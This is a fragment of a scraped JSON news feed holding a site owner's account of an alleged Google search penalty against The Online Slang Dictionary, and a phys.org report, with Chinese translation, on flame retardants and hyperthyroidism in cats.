started receiving a penalty on April 11,\r2011, and that&#39;s the date that the Panda changes were released to all English-speaking users\rof Google.\n    During the next seven months, I made dozens of structural changes and thousands of content\rchanges to the site - but\rthese changes had no effect on the amount of traffic referred by Google queries.\n  Largely as an experiment, I removed every citation from the site on November 5, 2011. I couldn&#39;t\rbelieve Google would be penalizing the site because of the presence of citations. After all,\rhigh-quality dictionaries have citations, and Google Panda was designed to penalize\r low-quality websites.\n  A week and a day later - on November 13 - the penalty was rescinded.\n       ( Show this section Hide this section.)\r\r October 6: Believing I had identified a way to restore the citations without\r incurring the penalty, I add them back to the site.\n  October 9: A Google employee used an internal tool to execute a penalty against this\r site.\n  November 16: To be able to compete with dictionary websites that don&#39;t have\r citations, I once again remove\r citations.\n    The citations were then missing from the site for almost a year. In early October 2012, I\ridentified what I believed was a way to restore citations to the site without being penalized by\rGoogle. The full inventory of citations - approximately 4,800 at that time - returned to the\rsite on October 6, 2012.\n                 This second penalty executed by Google against this site was manual. Recall that a\rpenalty against a web site causes web pages on that site to appear at a lower position in\rGoogle&#39;s search results than the position they have earned on their merit. A manual\rpenalty is one that has been activated by a human, by hand.\n  On October 9, 2011, a Google employee set an internal flag that executed a penalty\ragainst this site in a way that is both impossible to undo, and impossible to detect by\rthe site owner (me.)\n  I was only made aware of the penalty after a whistle-blower informed me of it.\n  There is no  truthful justification for this penalty. However, when a manual\rpenalty is activated, a reason can be recorded. The Google employee recorded the reason\ras being related to intellectual property law. But that makes no sense as there are no -\rand have never been any - intellectual property law violations on this site.\n  I tried a second approach to restore the citations, but it did not eliminate the\rpenalty. At this time, I was unaware that the penalty was manual. (Recall that this\rmanual penalty was set to be hidden from me.) Had I known, I wouldn&#39;t have continued\rto attempt to show this valuable information to my visitors.\n     On November 16, 2012, in order to be able to compete with dictionary websites that don&#39;t have\rcitations, I once again removed all\rcitations.\n  I had hoped that it would cause the penalty to be lifted. That is, I hoped that the\rGoogle employee that had executed the penalty against this site would see that I removed\rthe citations, and would undo the penalty.\n     Matt Cutts is an ex-Google employee. When he was at Google, he ran the Webspam team -\rthe team that is enirely responsible for both automated and manual penalties. They\rcreate the algorithms that execute automated penalties and write the policies for\rexecuting manual penalties.\n  On March 21, 2013 Matt Cutts wrote the following in response to someone asking how the\rowner of a small site could get a penalty resolved when Google had de-listed Digg.com in\rits entirety.  Cutts responded, in\rpart:\n  In general, when a member of the webspam team directly applies a manual webspam action\r against a site, we also drop a note to the site owner at http://google.com/webmasters/ .\r That helps the site owner tell whether something is going on with manual spam vs. just\r algorithmic ranking. Then any site can do a reconsideration request at the same place or\r post in our webmaster forum at https://productforums.google.com/forum/#!forum/webmasters .\n  I responded saying that though there appeared to be a manual penalty against my website,\rI received no notification of any form that there was a manual penalty. On March 22, 2013\rCutts  replied with the following:\n  Hi Walter, the only manual webspam action I see regarding onlineslangdictionary.com is\r from several years ago (are you familiar with a company called Web Build Pages or someone\r named Jim Boykin?), but that no longer applies here.\n  You&#39;re affected by a couple algorithms in our general web ranking. The first is our page\r layout algorithm. See  http://googlewebmastercentral.blogspot.com/2012/01/page-layo... or\r  http://searchengineland.com/google-may-penalize-ad-heavy-pag... for more\r context on that. In particular, comparing a page like  http://onlineslangdictionary.com/meaning-definition-of/compy to a page\r like  http://www.urbandictionary.com/define.php?term=Pepperazzi... , your site\r has much more prominent ads above the fold compared to Urban Dictionary.\n  Your site is also affected by our Panda algorithm. Here&#39;s a blog post we wrote to give\r guidance to sites that are affected by Panda:  http://googlewebmastercentral.blogspot.com/2011/05/more-guid...\n    Hi Walter, the only manual webspam action I see regarding onlineslangdictionary.com is\r from several years ago (are you familiar with a company called Web Build Pages or someone\r named Jim Boykin?), but that no longer applies here.\n    (If you&#39;re familiar with web ranking and SEO companies, an interesting thought experiment\ris: If Matt Cutts were telling the truth, how would a manual penalty against my site - or\rany site - be tied to both a specific person and a spefific company? For example, did the\rowner of an SEO company have a change of heart, provide Google with a complete customer\rlist, and Google - without any analysis whatsoever - just manually penalized the website\rof every one of those customers? a. That&#39;s not how it works. b. I&#39;ve never heard of the\rperson or company. What&#39;s a  legitimate way that a manual penalty could have been\rin place against my site - or any site - tied in some way to a specific person and a\rspecific company?)\n  There was never any manual webspam action against the website. Analysis of traffic\rreferred by Google searches shows smooth growth until Matt Cutts decided to kill the\rwebsite. There is zero evidence of a manual penalty, which would be obvious in the\rtraffic analysis.\n  You&#39;re affected by a couple algorithms in our general web ranking. The first is our page\r layout algorithm. See  http://googlewebmastercentral.blogspot.com/2012/01/page-layo... or\r  http://searchengineland.com/google-may-penalize-ad-heavy-pag... for more\r context on that. In particular, comparing a page like  http://onlineslangdictionary.com/meaning-definition-of/compy to a page\r like  http://www.urbandictionary.com/define.php?term=Pepperazzi... , your site\r has much more prominent ads above the fold compared to Urban Dictionary.\n  Despite Matt Cutts&#39; claim to the contrary, Urban Dictionary actually had  more\rscreen area devoted to ads than this site.\n  Nevertheless, I removed all ads for approximately 6 months. There was no change in the\ramount of search traffic that Google referred to my site. (Recall that when the\rprevious automated penalty was removed, search traffic was restored - this is how\rautomated penalties work.) Automated penalties are removed when the issue is fixed. It\rdoesn&#39;t happen immediately, but it happens far more quickly than 6 months. What does it\rmean if the issue was fixed and the penalty was never removed? It means that the penalty\rdidn&#39;t exist in the first place.\n  Your site is also affected by our Panda algorithm. Here&#39;s a blog post we wrote to give\r guidance to sites that are affected by Panda:  http://googlewebmastercentral.blogspot.com/2011/05/more-guid...\n  Just as I removed the ads, I removed all of the citations. There was no change in the\ramount of search traffic Google that referred to my site. (Recall that when the previous\rautomated penalty was removed, search traffic was restored - this is how automated\rpenalties work.) Automated penalties are removed when the issue is fixed. It doesn&#39;t\rhappen immediately, but it happens far more quickly than 6 months. What does it mean if\rthe issue was fixed and the penalty was never removed? It means that the penalty didn&#39;t\rexist in the first place.\n  So the question remains: how exactly do I know that Matt Cutts was lying? How do I\rknow that there was (and is) a manual penalty against my website?\n    I am going to start releasing details of my email conversation with the Google employee,\rculminating in my release of an MBOX file including full headers.\r Around the time of my exchange with Matt Cutts (see above) I had an email conversation\rwith a Google employee. It went something like this. (The below is heavily\rparaphrased. As time goes on, the below will come more and more to resemble the actual\rconversation.)\r Hey, I saw the article on your website. Is there anything I can do to help?\n  Subject: Re: What&#39;s with your article about the penalty? \r From: Walter Rader \r Date: redacted 2013\n  Yes. Could you please ask the web spam team what&#39;s up with the manual penalty\r against my website?\n  There is and has been a manual penalty against your site for some time. I can&#39;t help\r you.\n    The penalty is ongoing as of October 2020, and is killing The Online Slang\rDictionary.\n  Please help me in spreading the word. If you&#39;ve found The Online Slang Dictionary to be\ruseful, please let your friends and colleagues know about the site. The only way to save\rit is to get the word out.\n        If you work for Google, then we should speak soon. I can be reached at .\n          I just did a Google search and your site appeared in the first few results. Does that\rmean that the penalty has been removed?\n    &#34;Google Juice&#34; is an informal term for how favorably Google views a website and pages\ron that website. There are a lot of factors that go into how much juice websites and\rpages earn.\n  Every time you do a search, Google&#39;s algorithms evaluate every page on the web to\rdecide how relevant each page is to your query - how much Google Juice each of the pages\rhas for your query. Then they show the search results, which are ordered by the amount of\rGoogle Juice each page has.\n  What the penalty does is subtract an amount of Google Juice from every page on this\rsite. But whether that means we appear 1st, 2nd, or 307th in the search results depends on how much\rjuice each of the  other pages on the web have for your query.\n  You could think of it as a foot race. The penalty doesn&#39;t work as in: however you\rfinish in the race, Google will drop you down by 9 places. It works \n......", "posttime": "2020-10-19 11:13:14", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "google,\u8c37\u6b4c,\u8bcd\u5178,penalty,\u7f51\u7ad9", "title": "\u8c37\u6b4c\u5bf9\u5728\u7ebf\u4fda\u8bed\u8bcd\u5178\u7684\u5904\u7f5a", "title_en": "Google's penalty against The Online Slang Dictionary", "transed": 1, "url": "http://onlineslangdictionary.com/pages/google-panda-penalty/", "via": "", "real_tags": ["google", "\u8c37\u6b4c", "\u8bcd\u5178", "penalty", "\u7f51\u7ad9"]}, {"category": "", "categoryclass": "", "imagename": "85bb2f2c2e824932029c4646c7c4a70c.jpg", "infoid": 1029699, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6839\u636e\u4fc4\u52d2\u5188\u5dde\u7acb\u5927\u5b66\u7684\u4e00\u9879\u7814\u7a76\uff0c\u60a3\u6709\u7532\u72b6\u817a\u673a\u80fd\u4ea2\u8fdb\u75c7\u7684\u732b\u7684\u6d41\u884c\u53ef\u80fd\u662f\u56e0\u4e3a\u63a5\u89e6\u4e86\u5bb6\u5177\u4e2d\u5e38\u89c1\u7684\u963b\u71c3\u5242\u4e2d\u542b\u6709\u7684\u4e00\u79cd\u5316\u5b66\u7269\u8d28\u30021980\u5e74\u88ab\u8bca\u65ad\u4e3a\u7532\u72b6\u817a\u673a\u80fd\u4ea2\u8fdb\u75c7\u7684\u732b\u7684\u6570\u91cf\u662f\u6bcf200\u53ea\u4e2d\u5c31\u6709\u4e00\u53ea\u3002\u4eca\u5929\uff0c\u636e\u4f30\u8ba1\uff0c\u6bcf10\u53ea\u732b\u4e2d\u5c31\u6709\u4e00\u53ea\u60a3\u6709\u6b64\u75c5\u3002\n\u5728\u4fc4\u52d2\u5188\u5dde\u7acb\u5927\u5b66\u7684\u7814\u7a76\u4e2d\uff0c\u7531\u4fc4\u52d2\u5188\u5dde\u7acb\u519c\u4e1a\u79d1\u5b66\u9662\u7684\u73af\u5883\u5316\u5b66\u5bb6\u91d1\u00b7\u5b89\u5fb7\u68ee(Kim Anderson)\u5f00\u53d1\u7684\u7845\u80f6\u5ba0\u7269\u6807\u7b7e\u88ab\u8d34\u572878\u53ea\u7532\u4ea2\u548c\u975e\u7532\u4ea2\u732b\u7684\u9879\u5708\u4e0a\u3002\u8fd9\u4e9b\u732b\u4f69\u6234\u6807\u7b7e\u4e00\u5468\uff0c\u732b\u4e3b\u4eba\u586b\u5199\u4e86\u4e00\u4efd\u8c03\u67e5\u95ee\u5377\u3002\u4e00\u65e6\u6536\u96c6\u8d77\u6765\uff0c\u6807\u7b7e\u5c31\u4f1a\u7ecf\u8fc7\u4e00\u4e2a\u8fc7\u7a0b\uff0c\u901a\u8fc7\u5c06\u5316\u5b66\u7269\u8d28\u6d78\u6ce1\u5728\u6eb6\u5242\u4e2d\u6765\u63d0\u53d6\u5b83\u4eec\u3002\n\u732b\u79d1\u52a8\u7269\u88ab\u52a8\u91c7\u6837\u5668--\u7c7b\u4f3c\u4e8e\u72c2\u72ac\u75c5\u6807\u7b7e--\u4f7f\u7528\u7684\u6750\u6599\u4e0e\u5b89\u5fb7\u68ee\u5b9e\u9a8c\u5ba4\u53d1\u660e\u7684\u7845\u80f6\u8155\u5e26\u76f8\u540c\uff0c\u7528\u4e8e\u6d4b\u91cf\u4eba\u4f53\u63a5\u89e6\u73af\u5883\u5316\u5b66\u7269\u8d28\u7684\u60c5\u51b5\uff0c\u5305\u62ec2017\u5e74\u4f11\u65af\u987f\u54c8\u7ef4\u98d3\u98ce\u8fc7\u540e\u3002\n\u5b89\u5fb7\u68ee\u8bf4\uff0c\u8fd9\u4e9b\u6807\u7b7e\u662f\u591a\u5b54\u7684\uff0c\u5728\u5316\u5b66\u4e0a\u4e0e\u4eba\u7c7b\u7ec6\u80de\u975e\u5e38\u76f8\u4f3c\u3002\u6c61\u67d3\u7269\u5206\u5b50\u5d4c\u5165\u7845\u80f6\u7684\u65b9\u5f0f\u4e0e\u5b83\u4eec\u8fdb\u5165\u4eba\u4f53\u7ec6\u80de\u7684\u65b9\u5f0f\u76f8\u540c\u3002\u7845\u80f6\u76f8\u5f53\u597d\u5730\u6a21\u62df\u4e86\u4f60\u53ef\u4ee5\u5438\u6536\u7684\u5316\u5b66\u7269\u8d28\u7684\u7c7b\u578b--\u6211\u4eec\u79f0\u4e4b\u4e3a\u88ab\u52a8\u53d6\u6837\u3002\n\u8fd9\u9879\u7814\u7a76\u7531\u5b89\u5fb7\u68ee\u5b9e\u9a8c\u5ba4\u7684\u535a\u58eb\u751f\u5361\u7f57\u7433\u00b7\u666e\u5854\u65af(Carolyn Poutasse)\u9886\u5bfc\uff0c\u5979\u5728\u81f3\u5c11\u4e00\u4e2a\u6807\u7b7e\u4e0a\u53d1\u73b0\u4e8620\u591a\u4e2a\u4e2a\u4f53\u3002\u4f46\u662f\uff0c\u7532\u72b6\u817a\u673a\u80fd\u4ea2\u8fdb\u75c7\u732b\u548c\u975e\u7532\u72b6\u817a\u673a\u80fd\u4ea2\u8fdb\u75c7\u732b\u4f69\u6234\u7684\u6807\u7b7e\u4e4b\u95f4\uff0c\u53ea\u6709\u78f7\u9178\u4e09(1\uff0c3-\u4e8c\u6c2f-2-\u5f02\u4e19\u57fa)\u78f7\u9178\u916f(TDCIPP)\u7684\u6c34\u5e73\u4e0d\u540c\u3002TDCIPP\u662f\u4e00\u79cd\u66fe\u7528\u4e8e\u513f\u7ae5\u7761\u8863\u7684\u706b\u7130\uff0c\u4f46\u572820\u4e16\u7eaa70\u5e74\u4ee3\u672b\u505c\u6b62\u4f7f\u7528\u3002TDCIPP\u4ecd\u7136\u666e\u904d\u5e94\u7528\u4e8e\u8f6f\u57ab\u5bb6\u5177\u3001\u4e00\u4e9b\u5851\u6599\u548c\u4e00\u4e9b\u51dd\u80f6\u7a7a\u6c14\u6e05\u65b0\u5242\u7684\u6ce1\u6cab\u4e2d\u3002\n\u7814\u7a76\u53d1\u73b0\uff0c\u5373\u4f7f\u5728\u5065\u5eb7\u7684\u732b\u8eab\u4e0a\uff0c\u8f83\u9ad8\u7684TDCIPP\u6c34\u5e73\u4e5f\u4e0e\u7532\u72b6\u817a\u6fc0\u7d20\u6c34\u5e73\u76f8\u5173\u3002\n\u5b89\u5fb7\u68ee\u8bf4\uff0c\u732b\u88ab\u8bca\u65ad\u4e3a\u732b\u7532\u72b6\u817a\u673a\u80fd\u4ea2\u8fdb\u75c7\u7684\u65b9\u6cd5\u662f\u7532\u72b6\u817a\u6fc0\u7d20\u6d53\u5ea6\u6781\u9ad8\u3002\u770b\u5230\u8fd9\u79cd\u76f8\u5173\u6027\u6697\u793a\u4e86\u7532\u72b6\u817a\u529f\u80fd\u548c\u66b4\u9732\u4e8eTDCIPP\u4e4b\u95f4\u7684\u8054\u7cfb\u3002\nPoutasse\u8bf4\uff0c\u540c\u4e00\u4e2a\u5bb6\u5ead\u4e2d\u7684\u4e24\u53ea\u732b\u53ef\u80fd\u4f1a\u6709\u4e0d\u540c\u6c34\u5e73\u7684TDCIPP\uff0c\u56e0\u4e3a\u4e00\u53ea\u732b\u53ef\u80fd\u4f1a\u82b1\u66f4\u591a\u7684\u65f6\u95f4\u5728\u5bb6\u5177\u4e0a\uff0c\u800c\u53e6\u4e00\u53ea\u732b\u53ef\u80fd\u4f1a\u82b1\u66f4\u591a\u7684\u65f6\u95f4\u5728\u7a97\u53f0\u6216\u5176\u4ed6\u6ca1\u6709\u963b\u71c3\u5242\u7684\u5730\u65b9\u3002\u8986\u76d6\u5bb6\u5177\u4ee5\u63d0\u4f9b\u5c4f\u969c\uff0c\u51cf\u5c11\u7a7a\u6c14\u6e05\u65b0\u5242\u7684\u4f7f\u7528\u53ef\u80fd\u6709\u52a9\u4e8e\u964d\u4f4e\u732b\u7684TDCIPP\u66b4\u9732\u3002\n\u8fd9\u9879\u7814\u7a76\u6700\u8fd1\u53d1\u8868\u5728\u201c\u73af\u5883\u79d1\u5b66\u4e0e\u6280\u672f\u201d\u6742\u5fd7\u4e0a\u3002\u4fc4\u4ea5\u4fc4\u5dde\u7acb\u5927\u5b66\u7684\u5408\u4f5c\u4f19\u4f34\u5305\u62ec\u7ebd\u7ea6\u5e02\u52a8\u7269\u5185\u5206\u6ccc\u8bca\u6240\u7684\u9a6c\u514b\u00b7E\u00b7\u5f7c\u5f97\u68ee(Mark E.Peterson)\u535a\u58eb\uff0c\u4ed6\u662f\u7b2c\u4e00\u4f4d\u8bb0\u5f55\u732b\u7532\u72b6\u817a\u673a\u80fd\u4ea2\u8fdb\u75c7\u7684\u517d\u533b\u3002\n\u8fd9\u4e00\u53d1\u73b0\u8ba9\u7814\u7a76\u4eba\u5458\u5f00\u59cb\u601d\u8003\u4eba\u7c7b\u7684\u7532\u72b6\u817a\u673a\u80fd\u4ea2\u8fdb\u75c7\u3002\u5373\u4f7f\u5728\u6700\u521d\uff0c\u732b\u548c\u4eba\u7c7b\u7684\u7532\u72b6\u817a\u673a\u80fd\u4ea2\u8fdb\u75c7\u76f8\u5173\u7684\u826f\u6027\u80bf\u7624\u4e5f\u662f\u4e00\u6837\u7684\u3002\u7531\u6b64\u63a8\u65ad\uff0c\u7532\u72b6\u817a\u673a\u80fd\u4ea2\u8fdb\u75c7\u732b\u53ef\u80fd\u662f\u4eba\u7c7b\u7684\u54e8\u5175\uff0c\u8b66\u544a\u963b\u71c3\u5242\u548c\u4eba\u7c7b\u7532\u72b6\u817a\u673a\u80fd\u4ea2\u8fdb\u75c7\u4e4b\u95f4\u53ef\u80fd\u5b58\u5728\u8054\u7cfb\u3002\n\u5f53\u7136\uff0c\u8fd9\u5c31\u56de\u907f\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u5982\u679c\u6211\u4eec\u5bf9\u8fd9\u4e9b\u732b\u8fdb\u884c\u4e94\u5e74\u7684\u8ddf\u8e2a\u8c03\u67e5\uff0c\u5047\u8bbe\u5b83\u4eec\u66b4\u9732\u5728TDCIPP\u4e2d\u7684\u65f6\u95f4\u7ee7\u7eed\u589e\u52a0\uff0c\u8fd9\u4e9b\u5904\u4e8e\u6b63\u5e38\u7532\u72b6\u817a\u6fc0\u7d20\u6c34\u5e73\u8f83\u9ad8\u7aef\u7684\u732b\u662f\u5426\u4f1a\u7ee7\u7eed\u8fdb\u6b65\u5230\u8d8a\u6765\u8d8a\u9ad8\u7684\u6c34\u5e73\uff1f&#34\uff1b\u5b89\u5fb7\u68ee\u8bf4\u3002\u5982\u679c\u732b\u6700\u7ec8\u5f97\u4e86\u3002#34\uff1b\u90a3\u5c06\u662f\u4e00\u4e2a\u5f88\u81ea\u7136\u7684\u95ee\u9898\u3002\nPoutasse\u6307\u51fa\uff0c\u7f8e\u56fd\u6b63\u5728\u4f7f\u7528\u7684\u6570\u91cf\u7ee7\u7eed\u4e0a\u5347\u30021997\u5e74\uff0cTDCIPP\u7684\u9700\u6c42\u91cf\u4e3a450\u5428\uff0c2006\u5e74\u4e3a22,700\u5428\u3002\u79d1\u5b66\u5bb6\u4eec\u4e0d\u4ec5\u5f00\u59cb\u7814\u7a76\u963b\u71c3\u5242\u4e2d\u7684\u6709\u673a\u78f7\uff0c\u8fd8\u5f00\u59cb\u7814\u7a76\u5176\u884d\u751f\u7269\u3002\u5b89\u5fb7\u68ee\u548c\u666e\u5854\u65af\u8ba1\u5212\u7ee7\u7eed\u8bc4\u4f30\u76ee\u524d\u7814\u7a76\u4e2d\u6ca1\u6709\u6d4b\u91cf\u5230\u76841500\u591a\u79cd\u5316\u5b66\u7269\u8d28\u3002\n\u5b89\u5fb7\u68ee\u8bf4\uff0c\u5f53\u4f60\u89c2\u5bdf\u73af\u5883\u65f6\uff0c\u4f60\u4f1a\u7acb\u5373\u611f\u5230\u9707\u60ca\uff0c\u55ef\uff0c\u8fd9\u572860\u5e74\u4ee3\u548c70\u5e74\u4ee3\u8fd8\u6ca1\u6709\u88ab\u8bca\u65ad\u51fa\u6765\uff0c\u800c\u73b0\u5728\u5b83\u662f\u5341\u5206\u4e4b\u4e00\u3002\u5728\u8fd9\u6bb5\u65f6\u95f4\u91cc\uff0c\u5e02\u573a\u4e0a\u51fa\u73b0\u4e86\u54ea\u4e9b\u5316\u5b66\u54c1\uff1f\u5176\u4e2d\u6700\u5927\u7684\u4e00\u79cd\u662f\u963b\u71c3\u5242\u3002\u66f4\u591a\u4fe1\u606f\uff1a\u5361\u7f57\u7433\u00b7M\u00b7\u666e\u5854\u65af\u7b49\u4eba\u3002\u7845\u80f6\u5ba0\u7269\u6807\u7b7e\u4e0e\u4e09(1\uff0c3-\u4e8c\u6c2f-2-\u5f02\u4e19\u57fa)\u78f7\u9178\u916f\u66b4\u9732\u4e0e\u732b\u7532\u72b6\u817a\u673a\u80fd\u4ea2\u8fdb\u75c7\u7684\u5173\u8054\uff0c\u73af\u5883\u79d1\u5b66\u4e0e\u6280\u672f(2019\u5e74)\u3002Doi\uff1a10.1021/acs.est.9b02226", "note_en": "An epidemic of cats with hyperthyroidism may be explained by exposure to a chemical contained in flame retardants commonly found in furniture, according to an Oregon State University study.    The number of cats diagnosed with hyperthyroidism in 1980 was one in 200. Today it&#39;s estimated that one in 10 cats are afflicted.\n  For the Oregon State study, a silicone pet tag developed by Kim Anderson, an environmental chemist in the Oregon State College of Agricultural Sciences, was attached to the collars of 78 hyperthyroid and non-hyperthyroid cats. The cats wore the tags for a week and owners filled out a questionnaire. Once collected, the tags went through a process to extract the chemicals by soaking them in a solvent.\n  The feline passive samplers\u2014similar to a rabies tag\u2014are produced out of the same material used in the silicone wrist bands invented in Anderson&#39;s lab for measuring exposure to environmental chemicals in humans, including after Hurricane Harvey in Houston in 2017.\n  &#34;The tags are porous and chemically very similar to human cells,&#34; Anderson said. &#34;Molecules of contaminants embed themselves in the silicone in the same way they&#39;d go into the cells in your body. The silicone is a pretty good mimic of the types of chemicals that you can absorb\u2014what we call passive sampling.&#34;\n  The research, led by Carolyn Poutasse, a doctoral student in Anderson&#39;s lab, found over 20 individual   in at least one tag. But only levels of tris(1,3-dichloro-2-isopropyl) phosphate, or TDCIPP, a flame   once used in children&#39;s sleepwear and discontinued for that use in the late 1970s, differed between tags worn by hyperthyroid and non-hyperthyroid cats. TDCIPP is still commonly applied to the foam in upholstered furniture, some plastics and some gel air fresheners.\n  The research found that even in healthy cats, higher TDCIPP levels were correlated with thyroid hormone levels.\n  &#34;The way a cat is diagnosed with feline hyperthyroidism is by extremely elevated concentrations of thyroid hormones,&#34; Anderson said. &#34;Seeing the correlation is suggestive of a connection between thyroid function and exposure to TDCIPP.&#34;\n  Two cats in the same household can have different levels of TDCIPP, Poutasse said, because one cat may spend more time on furniture and the other on windowsills or other areas without flame retardant. Covering furniture to provide a barrier and reducing air freshener use may help lower a cat&#39;s TDCIPP exposure.\n  The study was recently published in  Environmental Science &amp; Technology. OSU partners included Dr. Mark E. Peterson of the Animal Endocrine Clinic in New York City, the first veterinarian to document feline hyperthyroidism.\n  The findings have led researchers to think about hyperthyroidism in humans. Even at the   the benign tumor associated with feline hyperthyroidism is identical in cats and humans. Extrapolating from that, hyperthyroid cats could be sentinels for humans, warning of a possible link between flame retardants and human hyperthyroidism.\n  &#34;Of course, that begs the question, if we follow these cats for five years, would those cats on the higher end of normal thyroid hormone levels continue to progress to have higher and higher levels assuming their exposure to TDCIPP continues to be elevated?&#34; Anderson said. &#34;That would be the natural question if cats end up with  .&#34;\n  The amount of the   in use in the U.S. continues to rise, Poutasse noted. In 1997, demand for TDCIPP was 450 tons and in 2006 it was 22,700 tons. Scientists are beginning to look not only at the organophosphates in flame retardants, but also the derivatives. Anderson and Poutasse plan to continue evaluation of over 1,500 chemicals not measured in the current study.\n  &#34;When you look at the environment, you&#39;re immediately struck by, well, this wasn&#39;t diagnosed in the &#39;60s and &#39;70s, and now it&#39;s one in 10,&#34; said Anderson. &#34;What chemicals came on the market in that time period? One of the biggest ones is   retardants.&#34;        More information:\t\t\t\t\t\t\t\t\t\t\t\tCarolyn M. Poutasse et al. Silicone Pet Tags Associate Tris(1,3-dichloro-2-isopropyl) Phosphate Exposures with Feline Hyperthyroidism,  Environmental Science &amp; Technology (2019).  DOI: 10.1021/acs.est.9b02226", "posttime": "2020-10-19 10:33:28", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u4ea2\u8fdb\u75c7,hyperthyroidism,\u7532\u72b6\u817a", "title": "\u5bb6\u5177\u4e2d\u7684\u963b\u71c3\u5242\u5bfc\u81f4\u732b\u7532\u72b6\u817a\u673a\u80fd\u4ea2\u8fdb\u75c7\u589e\u52a020\u500d", "title_en": "Fire retardants in furniture caused 20x increase in hyperthyroidism in cats", "transed": 1, "url": "https://phys.org/news/2019-08-flame-retardant-hyperthyroidism-cats.html#:~:text=An%20epidemic%20of%20cats%20with,in%2010%20cats%20are%20afflicted.", "via": "", "real_tags": ["\u4ea2\u8fdb\u75c7", "\u7532\u72b6\u817a"]}]